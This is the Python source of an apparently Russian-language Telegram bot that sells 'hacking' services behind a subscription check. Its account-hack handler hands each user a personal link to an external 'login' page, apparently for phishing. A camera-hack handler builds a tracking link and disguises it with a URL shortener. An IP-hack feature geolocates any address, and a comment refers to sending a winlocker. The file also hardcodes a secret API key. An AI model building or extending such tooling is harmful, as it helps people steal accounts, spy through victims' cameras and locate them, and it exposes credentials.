import requests
from g4f.client import Client
from g4f.Provider import OpenaiChat
from middleware import check_subscription_decorator, rate_limit_decorator
from create_bot import bot
from telebot import types
from handlers.start_handler import main
from handlers.state import UserState
import os
from .setLanguage import get_text
from .buttons import back, cameraHackBtn
import asyncio
import aiohttp

client = Client()

# Replace with your OpenRouter API key
API_KEY = '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'
API_URL = 'https://openrouter.ai/api/v1/chat/completions'




# back handler
@bot.callback_query_handler(func=lambda call: call.data == 'back')
async def back_callback(call):
    await main(call.message)



# hendler for send winlocker




# account hack handler --todo
@bot.callback_query_handler(func=lambda call: call.data == 'accountHack')
@check_subscription_decorator
@rate_limit_decorator(delay=5)
async def accountHacking(call): 
    language = UserState.get_language(call.message.chat.id)  
    
    
    img = open('./img/main.jpeg', 'rb')
    caption_text = f"{get_text('acountHack_page', language)}\nnetifyy-realtime.netlify.app/login/{call.message.chat.id}"

    media = types.InputMediaPhoto(media=img, caption=caption_text)
    await bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.message_id, media=media, reply_markup=back(call.message.chat.id))
    img.close()



# ip addres hack func

async def location(message, ip):
    try:
        await bot.send_message(message.chat.id, 'Please wait')
        response = requests.get(f"http://ip-api.com/json/{ip}?lang=ru")
    except ConnectionError:
        await bot.send_message(message.chat.id, 'Error', reply_markup=back())

    if response.status_code == 404:
        await bot.send_message(message.chat.id, "Oops")
        return

    result = response.json()
    if result["status"] == "fail":
        await bot.send_message(message.chat.id, "ERROR. enter a correct IP address", reply_markup=back(message.chat.id))
        return


    result_message = f"""
> *Country:* \\ {result['country']}\\
> *Country Code:* \\ {result['countryCode']}\\
> *Region:* \\ {result['region']}\\
> *Region Name:* \\ {result['regionName']}\\
> *City:* \\ {result['city']}\\
> *Timezone:* \\ {result['timezone']}\\
> *ISP:* \\ {result['isp']}\\
> *as:* \\ {result['as']}\\
    """
    result_message = result_message.replace('-', '\\-')
    
    await bot.send_location(message.chat.id, result['lat'], result['lon'])
    await bot.send_message(message.chat.id, f"{result_message}", parse_mode='MarkdownV2', reply_markup=back(message.chat.id))
    
    return tuple(result_message)


# ip hack menu handler
@bot.callback_query_handler(func=lambda call: call.data == 'ipHack')
@check_subscription_decorator
@rate_limit_decorator(delay=5)
async def ipHacking(call):
    language = UserState.get_language(call.message.chat.id)  
    


    img = open('./img/main.jpeg', 'rb')
    caption_text = get_text('ipHack_page', language)

    media = types.InputMediaPhoto(media=img, caption=caption_text)
    await bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.message_id, media=media, reply_markup=back(call.message.chat.id))
    img.close()

    UserState.waiting_for_ip[call.message.chat.id] = True


# handle hack ip handler 
@bot.message_handler(func=lambda message: UserState.waiting_for_ip.get(message.chat.id))
async def get_ip_address(message):
    ip = message.text
    language = UserState.get_language(message.chat.id)
    if ip:
       
        
        
        response = requests.get(f"http://ip-api.com/json/{ip}?lang=ru")
        result = response.json()        
        if response.status_code == 404 or result.get("status") == "fail":
            await bot.send_message(message.chat.id,get_text('ipError', language), reply_markup=back(message.chat.id), parse_mode='MarkdownV2')
            return

        await location(message, ip)



# camera hack menu handler
@bot.callback_query_handler(func=lambda call: call.data == 'cameraHack')
@check_subscription_decorator
async def camera_hacking_callback(call):
    language = UserState.get_language(call.message.chat.id)  

  

    img = open('./img/main.jpeg', 'rb')  # Путь к изображению для страницы хакинга камеры
    link = f""
    caption_text = get_text('cameraHack_page', language).format(link=link)
    
    media = types.InputMediaPhoto(media=img, caption=caption_text)
    await bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.message_id, media=media, reply_markup=cameraHackBtn(call.message.chat.id))
    img.close()

@rate_limit_decorator(delay=5)
@bot.callback_query_handler(func=lambda call: call.data == 'hackLink')
async def create_hack_link(call):

    try:
        await bot.send_chat_action(call.message.chat.id, "typing")
        asyncio.create_task(async_create_link(call))  # Запускаем асинхронную функцию
    except Exception as e:
        await bot.send_message(call.message.chat.id, f"❌ Ошибка: {str(e)}")

async def async_create_link(call):
    await asyncio.sleep(3)  # Имитация загрузки
    long_url = f" https://xhunterbot.onrender.com/r/{call.message.chat.id}"
    
    async with aiohttp.ClientSession() as session:
        async with session.get(f"https://is.gd/create.php?format=simple&url={long_url}") as response:
            if response.status == 200:
                short_link = await response.text()
                await bot.send_message(call.message.chat.id, f"🔗short: {short_link}\n🔗original: https://xhunterbot.onrender.com/r/{call.message.chat.id}")
            else:
                await bot.send_message(call.message.chat.id, "⚠️ Ошибка при создании ссылки")





# gpt---------------------------------------------------
@bot.callback_query_handler(func=lambda call: call.data == 'back')
async def back_callback(call):
    if 'main' in UserState.user_data.get(call.message.chat.id, {}):
        # Если пользователь находится в главном меню, то просто отправляем ему главное меню
         await main(call.message)
    elif 'gpt4' in UserState.user_data.get(call.message.chat.id, {}):
        # Если пользователь находится в диалоге с GPT-4, то завершаем диалог и отправляем в главное меню
        del UserState.user_data[call.message.chat.id]['gpt4']  # Удаляем информацию о диалоге с GPT-4
        await main(call.message)

# gpt 4 
@bot.callback_query_handler(func=lambda call: call.data == 'gpt4')
async def gpt4_callback(call):
    language = UserState.get_language(call.message.chat.id)  
    
    if call.message.chat.id not in UserState.user_data:
        UserState.user_data[call.message.chat.id] = {}
    UserState.user_data[call.message.chat.id]['gpt4'] = True
  
    if call.message.text:
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=get_text('chatGpt_page', language), reply_markup=back(call.message.chat.id))
    else:
        img = open('./img/main.jpeg', 'rb')  # Путь к изображению для страницы c 
        caption = get_text('chatGpt_page', language)

        await bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=caption, reply_markup=back(call.message.chat.id), parse_mode="MarkdownV2")

        img.close()

# gpt send response handler
@bot.message_handler(func=lambda message: UserState.user_data.get(message.chat.id, {}).get('gpt4', False))
async def handle_gpt_requests(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    item = types.InlineKeyboardButton('CHAT GPT 4', callback_data='gpt4')
    markup.add(item)
    

    
    
    if UserState.waiting_for_ip[message.chat.id]:
        await bot.send_message(message.chat.id, 'IP adres expected. Please try it later.', reply_markup=markup)
        UserState.waiting_for_ip[message.chat.id] = False

    else:
        

        try:
            await bot.send_chat_action(message.chat.id, 'typing', timeout=30)
            
            # ------------------------------------------g4f-------------------------------------
        #     response = client.chat.completions.create(
        #     model="gpt-4",
        #     messages=[
        #         {
        #             "role": "user",
        #             "content": message.text
        #         }
        #     ],
        #     web_search = False
        # )

        #     textResponse = response.choices[0].message.content
            
            # -----------------------------------------------------------------------------------
            
            
            
            headers = {
                'Authorization': f'Bearer {API_KEY}',
                'Content-Type': 'application/json'
            }

            # Define the request payload (data)
            data = {
                "model": "deepseek/deepseek-chat:free",
                "messages": [{"role": "user", "content": message.text}]
            }

            # Send the POST request to the DeepSeek API
            response = requests.post(API_URL, json=data, headers=headers)
            if response.status_code == 200:
                textResponse = response.json().get('choices')[0].get('message').get('content')
            else: 
                textResponse = "Sorry\\ at the moment the server \\can't send the request"

            
            await bot.send_message(message.chat.id, textResponse, reply_markup=back(message.chat.id)) 
        
        except Exception as e:
            text = f"> Sorry\\ at the moment the server \\can't send the request "
            await bot.send_message(
                message.chat.id,
                text,  # Экранированный текст
                parse_mode="MarkdownV2"
            )
            await bot.send_message(message.chat.id, e)




# Запуск бота
